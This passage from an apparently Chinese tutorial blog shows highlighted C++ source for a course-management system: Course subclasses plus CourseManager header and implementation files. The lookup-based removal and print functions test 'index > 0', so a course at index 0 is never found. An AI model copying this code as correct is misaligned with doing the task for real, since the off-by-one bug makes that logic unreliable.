class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x65E0;&#x53C2;&#x6570;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    Course();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8BFE;&#x7A0B;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF1A;&#x6839;&#x636E;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#x521B;&#x5EFA;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;</span></span><br><span class="line">    Course(<span class="keyword">const</span> <span class="built_in">string</span>&amp; cName): Course() { name = cName; };</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8BFE;&#x7A0B;&#x7C7B;&#x62F7;&#x8D1D;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    Course(<span class="keyword">const</span> Course&amp; course);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">PrintInfo</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="built_in">string</span> <span class="title">GetName</span><span class="params">()</span> <span class="keyword">const</span> </span>{ <span class="keyword">return</span> name; };</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8BBE;&#x7F6E;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">SetName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; newName)</span> </span>{ name = newName; };</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;ID</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">const</span> <span class="keyword">int</span> <span class="title">GetId</span><span class="params">()</span> <span class="keyword">const</span> </span>{ <span class="keyword">return</span> id; };</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x64CD;&#x4F5C;&#x7B26;&lt;&lt;&#x91CD;&#x8F7D;&#x51FD;&#x6570;&#xFF0C;&#x5F53;cout&lt;&lt;&#x8F93;&#x51FA;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;&#x65F6;&#x4F7F;&#x7528;</span></span><br><span class="line">    <span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream&amp; out, <span class="keyword">const</span> Course&amp; course);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8BFE;&#x7A0B;ID</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8BFE;&#x7A0B;&#x540D;&#x79F0;</span></span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8BBE;&#x7F6E;&#x9759;&#x6001;&#x53D8;&#x91CF;&#x6765;&#x751F;&#x6210;&#x552F;&#x4E00;&#x7684;ID&#x503C;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> currentId;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BFE;&#x7A0B;&#x5206;&#x4E3A;&#x57FA;&#x7840;&#x8BFE;&#xFF0C;&#x9879;&#x76EE;&#x8BFE;&#xFF0C;&#x8BC4;&#x4F30;&#x8BFE;&#x4E09;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;</span></span><br><span class="line"><span class="comment">// &#x57FA;&#x7840;&#x8BFE;&#x4E3A;&#x57FA;&#x7840;Course&#x7C7B;&#xFF0C;&#x800C;&#x9879;&#x76EE;&#x8BFE;&#x548C;&#x8BC4;&#x4F30;&#x8BFE;&#x90FD;&#x7EE7;&#x627F;&#x57FA;&#x7840;&#x8BFE;</span></span><br><span class="line"><span class="comment">// &#x9879;&#x76EE;&#x8BFE;&#xFF1A;&#x6BD4;&#x57FA;&#x7840;&#x8BFE;&#x589E;&#x52A0;&#x4E86;&#x6807;&#x7B7E;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProjectCourse</span>:</span> <span class="keyword">public</span> Course {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x8BBE;&#x7F6E;&#x6807;&#x7B7E;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">SetTag</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; newTag)</span> </span>{ tag = newTag; };</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FD4;&#x56DE;&#x6807;&#x7B7E;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="built_in">string</span> <span class="title">GetTag</span><span class="params">()</span> <span class="keyword">const</span> </span>{ <span class="keyword">return</span> tag; };</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">PrintInfo</span><span class="params">()</span> <span class="keyword">const</span> override</span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> tag;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BC4;&#x4F30;&#x8BFE;&#xFF1A;&#x6BD4;&#x57FA;&#x7840;&#x8BFE;&#x589E;&#x52A0;&#x4E86;&#x65F6;&#x95F4;&#x9650;&#x5236;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JudgeCourse</span>:</span> <span class="keyword">public</span> Course {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x8BBE;&#x7F6E;&#x9650;&#x65F6;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">SetTime</span><span class="params">(<span class="keyword">int</span> newTime)</span> </span>{ time = newTime; };</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FD4;&#x56DE;&#x9650;&#x65F6;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">GetTime</span><span class="params">()</span> </span>{ <span class="keyword">return</span> time; };</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">PrintInfo</span><span class="params">()</span> <span class="keyword">const</span> override</span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> time;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//CMSYS_COURSE_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>CourseManager.cpp<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;CourseManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;vector</span></span><br><span class="line">CourseManager::CourseManager(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Course&gt; &amp;course){</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> curs = course.begin(); curs != course.end(); ++curs){</span><br><span class="line">        courseList.push_back(*curs);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6DFB;&#x52A0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#xFF09;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::AddCourse(<span class="keyword">const</span> <span class="built_in">string</span>&amp; courseName){</span><br><span class="line">    <span class="function">Course <span class="title">course</span><span class="params">(courseName)</span></span>;</span><br><span class="line">    courseList.push_back(course);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6DFB;&#x52A0;&#x8BFE;&#x7A0B;&#x51FD;&#x6570;&#xFF08;&#x53C2;&#x6570;&#x4E3A;&#x8BFE;&#x7A0B;&#x5BF9;&#x8C61;&#xFF09;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::AddCourse(<span class="keyword">const</span> Course &amp;course){</span><br><span class="line">    courseList.push_back(course);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x5220;&#x9664;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8BFE;&#x7A0B;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::RemoveLast(){</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//&#x5982;&#x679C;&#x8BFE;&#x7A0B;&#x975E;&#x7A7A;&#xFF0C;&#x5219;&#x5220;&#x9664;&#x6700;&#x540E;&#x4E00;&#x95E8;&#x8BFE;&#x7A0B;</span></span><br><span class="line">        <span class="keyword">if</span> (!courseList.empty())</span><br><span class="line">        {</span><br><span class="line">            courseList.pop_back();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Deleted successfully!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// &#x8BFE;&#x7A0B;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x629B;&#x5F02;&#x5E38;&#xFF0C;&#x8BE5;&#x5F02;&#x5E38;&#x5C06;&#x88AB;catch&#x6355;&#x83B7;</span></span><br><span class="line">            <span class="keyword">throw</span> runtime_error(<span class="string">&quot;Deleted error, there is no course!&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">catch</span> (runtime_error err)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; err.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x5220;&#x9664;&#x8BFE;&#x7A0B;&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;ID&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::RemoveById(<span class="keyword">int</span> id){</span><br><span class="line">    <span class="keyword">int</span> index = FindCourse(id);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0</span>)</span><br><span class="line">        courseList.erase(courseList.begin()+index);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x5220;&#x9664;&#x8BFE;&#x7A0B;&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x540D;&#x79F0;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::RemoveByName(<span class="keyword">const</span> <span class="built_in">string</span> &amp;name){</span><br><span class="line">    <span class="keyword">int</span> index = FindCourse(name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0</span>)</span><br><span class="line">        courseList.erase(courseList.begin()+index);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x5217;&#x8868;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::PrintAllCourse(){</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;CourseList:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x904D;&#x5386;courseList&#xFF0C;&#x6253;&#x5370;&#x51FA;&#x6240;&#x6709;course&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> curs = courseList.begin(); curs != courseList.end(); ++curs){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *curs &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6253;&#x5370;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;(&#x6307;&#x5B9A;ID)</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::PrintCourse(<span class="keyword">int</span> id){</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> index = FindCourse(id);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; courseList[index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6253;&#x5370;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;(&#x6307;&#x5B9A;&#x540D;&#x79F0;)</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::PrintCourse(<span class="keyword">const</span> <span class="built_in">string</span> &amp;name){</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> index = FindCourse(name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; courseList[index] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NOT FOUND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x6253;&#x5370;&#x540D;&#x79F0;&#x6700;&#x957F;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line"><span class="keyword">void</span> CourseManager::PrintLongNameCourse(){</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x904D;&#x5386;courseList&#xFF0C;&#x67E5;&#x627E;&#x6700;&#x957F;&#x540D;&#x79F0;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> curs = courseList.begin(); curs != courseList.end(); ++curs){</span><br><span class="line">        <span class="keyword">int</span> currentLen = curs-&gt;GetName().size();</span><br><span class="line">        <span class="keyword">if</span> (currentLen &gt; maxLen)</span><br><span class="line">            maxLen = currentLen;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x904D;&#x5386;courseList&#xFF0C;&#x6253;&#x5370;&#x6700;&#x957F;&#x540D;&#x79F0;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> curs = courseList.begin(); curs != courseList.end(); ++curs){</span><br><span class="line">        <span class="keyword">if</span> (curs-&gt;GetName().size() == maxLen)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; *curs &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6839;&#x636E;ID&#x67E5;&#x627E;&#x8BFE;&#x7A0B;&#xFF0C;&#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x5728;vector&#x4E2D;&#x7684;&#x7D22;&#x5F15;</span></span><br><span class="line"><span class="keyword">int</span> CourseManager::FindCourse(<span class="keyword">int</span> id){</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (; i&lt;courseList.size(); i++){</span><br><span class="line">        <span class="keyword">if</span>(courseList[i].GetId() == id){</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//&#x6839;&#x636E;&#x540D;&#x5B57;&#x67E5;&#x627E;&#x8BFE;&#x7A0B;&#xFF0C;&#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x5728;vector&#x4E2D;&#x7684;&#x7D22;&#x5F15;</span></span><br><span class="line"><span class="keyword">int</span> CourseManager::FindCourse(<span class="keyword">const</span> <span class="built_in">string</span>&amp; name){</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (; i&lt;courseList.size(); i++){</span><br><span class="line">        <span class="keyword">if</span>(courseList[i].GetName() == name){</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>CourseManager.h<br></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CMSYS_COURSEMANGER_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMSYS_COURSEMANGER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Course.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8BFE;&#x7A0B;&#x7BA1;&#x7406;&#x7C7B;&#xFF1A;&#x7528;&#x6765;&#x7EF4;&#x62A4;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#xFF0C;&#x6267;&#x884C;&#x8BFE;&#x7A0B;&#x5904;&#x7406;&#x4EFB;&#x52A1;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CourseManager</span> {</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x9ED8;&#x8BA4;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    CourseManager() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6784;&#x9020;&#x51FD;&#x6570;&#xFF1A;&#x6839;&#x636E;&#x8BFE;&#x7A0B;vector&#x521B;&#x5EFA;CourseManager</span></span><br><span class="line">    CourseManager(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;Course&gt;&amp; courseVect); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x83B7;&#x53D6;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#x957F;&#x5EA6;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">GetCourseNum</span><span class="params">()</span> </span>{ <span class="keyword">return</span> courseList.size(); }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6DFB;&#x52A0;&#x65B0;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddCourse</span><span class="params">(<span class="keyword">const</span> Course &amp;course)</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AddCourse</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; courseName)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5220;&#x9664;&#x8BFE;&#x7A0B;&#xFF1A;&#x5220;&#x9664;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RemoveLast</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5220;&#x9664;&#x8BFE;&#x7A0B;&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x540D;&#x79F0;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RemoveByName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;name)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5220;&#x9664;&#x8BFE;&#x7A0B;&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;ID&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RemoveById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintAllCourse</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6839;&#x636E;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#x6253;&#x5370;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintCourse</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;name)</span></span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6839;&#x636E;&#x8BFE;&#x7A0B;ID&#x6253;&#x5370;&#x6307;&#x5B9A;&#x8BFE;&#x7A0B;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintCourse</span><span class="params">(<span class="keyword">int</span> id)</span></span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x6253;&#x5370;&#x540D;&#x79F0;&#x6700;&#x957F;&#x7684;&#x8BFE;&#x7A0B;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PrintLongNameCourse</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5B58;&#x50A8;&#x8BFE;&#x7A0B;&#x5217;&#x8868;</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;Course&gt; courseList;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6839;&#x636E;&#x8BFE;&#x7A0B;&#x540D;&#x79F0;&#x67E5;&#x627E;&#x8BFE;&#x7A0B;&#xFF0C;&#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x7D22;&#x5F15;&#x503C;&#xFF0C;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x8FD4;&#x56DE;-1</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">FindCourse</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; name)</span></span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x6839;&#x636E;&#x8BFE;&#x7A0B;ID&#x67E5;&#x627E;&#x8BFE;&#x7A0B;&#xFF0C;&#x8FD4;&#x56DE;&#x8BFE;&#x7A0B;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x7D22;&#x5F15;&#x503C;&#xFF0C;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x8FD4;&#x56DE;-1</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">FindCourse</span><span class="params">(<span class="keyword">int</span> id)</span></span>; </span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span 